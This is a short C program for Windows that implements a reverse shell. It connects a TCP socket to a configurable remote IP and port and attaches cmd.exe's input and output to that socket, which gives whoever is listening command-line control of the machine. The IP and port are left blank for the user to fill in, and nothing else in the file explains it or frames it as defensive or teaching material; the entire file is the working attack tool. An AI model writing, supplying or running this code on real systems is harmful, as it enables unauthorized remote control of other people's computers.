#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#define IP 
#define PORT 

#pragma comment(lib, "ws2_32")

int main(int argc, char *argv[]) 
{
   WSADATA wsaData;
   SOCKET sock;
   struct sockaddr_in server;
   STARTUPINFO si;
   PROCESS_INFORMATION pi;
   WSAStartup(MAKEWORD(2, 2), &wsaData);
   sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
   server.sin_family = AF_INET;
   server.sin_addr.s_addr = inet_addr(IP);
   server.sin_port = htons(atoi(PORT));
   WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL);
   memset(&si, 0, sizeof(si));
   si.cb = sizeof(si);
   si.dwFlags = STARTF_USESTDHANDLES;
   si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
   CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
   WaitForSingleObject(pi.hProcess, INFINITE);
   closesocket(sock);
   WSACleanup();
   return 0;
}
